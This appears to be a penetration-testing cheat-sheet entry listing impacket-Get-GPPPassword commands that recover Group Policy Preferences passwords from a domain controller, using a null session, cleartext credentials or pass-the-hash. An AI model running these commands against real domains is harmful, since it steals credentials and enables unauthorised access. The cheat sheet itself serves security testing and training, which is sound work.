# Get-GPPPassword

## Get-GPPPassword - with a NULL session
```
impacket-Get-GPPPassword -no-pass '<DC>'
```
# Get-GPPPassword - with cleartext credentials
```
impacket-Get-GPPPassword '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```
# Get-GPPPassword - pass-the-hash
```
impacket-Get-GPPPassword -hashes '<HASH>' '<DOMAIN>'/'<USER>':'<PASSWORD>'@'<DC>'
```